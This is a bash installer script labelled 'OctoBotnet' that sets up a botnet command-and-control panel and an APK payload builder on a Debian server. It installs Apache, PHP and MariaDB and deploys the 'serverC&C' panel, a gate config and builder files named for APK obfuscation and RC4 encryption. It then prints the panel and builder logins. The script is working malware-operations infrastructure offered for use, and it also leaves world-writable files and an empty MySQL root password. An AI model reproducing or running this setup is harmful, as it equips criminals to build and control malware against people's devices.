#!/bin/bash
#OctoBotnet
#ONLY DEBIAN 11 8 gb RAM / 100 GB / 4 cores, Server Internet speed 100 megabytes

echo "Your ISP IP(Domain, Exmaple; yourdomain:8080): "
read ispipdomain

builderpassword=$(openssl rand -hex 8)
sqlpassword=$(openssl rand -hex 32)

sleep 5

apt update 
apt install sudo -y
apt install systemctl -y
apt install nano -y 
apt install python -y 
apt install python2 -y 
apt install python3 -y 
apt install gnupg gnupg2 -y 
apt install apache2 -y
apt install openjdk-17-jre -y
apt install openjdk-17-jdk -y
apt-get install build-essential libxml2-dev libssl-dev libbz2-dev libcurl4-openssl-dev libjpeg-dev libpng-dev libfreetype6-dev libmcrypt-dev libreadline-dev libtidy-dev libxslt-dev libzip-dev apache2-dev -y
apt install curl wget -y
apt install unzip zip -y
apt-get install software-properties-common -y
apt install apt-transport-https lsb-release ca-certificates -y


#UPDATE PHP
wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
apt install -y curl wget gnupg2 ca-certificates lsb-release apt-transport-https
wget https://packages.sury.org/php/apt.gpg
apt-key add apt.gpg
echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/php7.list
apt update

sleep 5

#INSTALL PHP + MARIADB
apt install php7.1 -y
apt install mariadb-server-10.5 -y
apt-get install libapache2-mod-ssl -y
apt install php7.1-cli php7.1-cgi php7.1-common php7.1-xml php7.1-json php7.1-mysql php7.1-mysqli php7.1-bz2 php7.1-gd php7.1-mcrypt php7.1-mbstring php7.1-curl php7.1-zip -y
a2enmod ssl
a2enmod php7.1
service apache2 restart
#SETTINGS install
mkdir /var/data
mkdir /var/data/www
chown -R www-data:www-data /var/data/www
chmod -R 755 /var/data/www
#SETTINGS INSTALL MARIADB(MYSQL)
service mysql restart
chmod 0777 /var/run/mysqld

sleep 5

mysql -uroot --password="" -e 'CREATE DATABASE `database`;'

sleep 5

mysql -uroot --password="" -e "CREATE USER 'user'@'localhost' IDENTIFIED BY '$sqlpassword';"

sleep 5

mysql -uroot --password="" -e 'use `database`; source database.sql;'

sleep 5

mysql -uroot --password="" -e "GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost';"

sleep 5

mysql -uroot --password="" -e "FLUSH PRIVILEGES;"

sleep 5

mv cfgs-server/site/panel.conf /etc/apache2/sites-available/
mv cfgs-server/ssl /var/data/www/
rm -rf /var/www/html
a2dissite default-ssl

sleep 5

sed -i 's/\.\.yourpassword\.\./'"$sqlpassword"'/g' cfgs-server/phpapache2/config.php
sed -i 's/\.\.yourpassword\.\./'"$sqlpassword"'/g' cfgs-server/mysql/mysql.txt
sed -i 's/\.\.yourpassword\.\./'"$sqlpassword"'/g' server_gate/www/gate/config.php
#UPLOADING
mv www/builder_www /var/www/html
mv www/server_www /var/data/www/
sleep 5

chown -R www-data:www-data /var/www
mv cfgs-server/phpapache2/apache_error.log /var/data/www/
mv cfgs-server/phpapache2/php_error.log /var/data/www/
cp cfgs-server/mysql/mysql.txt /var/www/
mv cfgs-server/mysql/mysql.txt /var/data/www/
mv cfgs-server/phpapache2/config.php /var/data/www/server_www/rootMD50MA/
rm /etc/php/7.1/apache2/php.ini
mv cfgs-server/phpapache2/php.ini /etc/php/7.1/apache2/

sleep 5
#ON Server Octo
service apache2 restart
a2ensite panel.conf

sleep 5

service apache2 restart


sleep 5
#Permis. config
#serverC&C
chmod 0777 /var/data/www/server_www/rootMD50MA/data
chmod 0777 /var/data/www/server_www/rootMD50MA/pdo.php
#builder
chmod 0777 /var/www/html/builderxxxzzz/script.php
chmod 0777 /var/www/html/builderxxxzzz/obsufapk.php
chmod 0777 /var/www/html/builderxxxzzz/rc4encryption
sleep 5

#Setup Backup Settings;
#get backup
rm -rf /var/data/www/server_www/rootMD50MA/backups/get_backup.sh
read -r -d '' GETBACKUP << EOM
#!/bin/bash

BACKENDIPGET=$ispipdomain
FOLDER=rootMD50MA

cd `dirname "$0"`
pwd
NAME=backup_`date +%d.%m.%y`.zip
wget --no-check-certificate https://$BACKENDIPGET/$FOLDER/backups/backup.zip -O $NAME
echo DONE

EOM

echo "$GETBACKUP" > /root/get_backup.sh

sleep 5

rm -rf /var/data/www/server_www/rootMD50MA/backups/make_backup.sh
read -r -d '' MAKEBACKUP << EOM
#!/bin/bash

MYSQL_PASSWORD=$sqlpassword
MYSQL_DB=database

cd `dirname "$0"`
pwd
mysqldump -uroot -p$MYSQL_PASSWORD $MYSQL_DB > db.sql
zip -r9 -P$MYSQL_PASSWORD backup.zip db.sql ../data/*.log
rm db.sql
date +%s > ../static/last_backup.ts
echo "DONE, password $MYSQL_PASSWORD"

EOM

echo "$MAKEBACKUP" > /var/data/www/server_www/rootMD50MA/backups/make_backup.sh

sleep 5

chmod 0777 /root/get_backup.sh
chmod 0777 /var/data/www/server_www/rootMD50MA/backups/make_backup.sh

sleep 5

service cron start



sleep 5
# Clear
rm -rf cfgs-server
rm -rf www
rm database.sql
sed -i 's/\.\.yourpassword\.\./'"$sqlpassword"'/g' SETUPHELP.txt
sed -i 's/\.\.passbuilder\.\./'"$builderpassword"'/g' /var/www/html/builderxxxzzz/index.php
sed -i 's/\.\.passbuilder\.\./'"$builderpassword"'/g' SETUPHELP.txt
echo ""
echo "-------------------------------"
echo "Installation complete 0Ct0"
echo "sql user: user"
echo "sql password: $sqlpassword"
echo "panel; http://$ispipdomain/rootMD50MA/panelcGFuZWxleG9kdXNvY3Rv"
echo "builder; http://youripdomain:80/builderxxxzzz"
echo "login builder; admin"
echo "password builder; $builderpassword"
echo "Change Panel Login + Password, open pls SETUPHELP.txt."
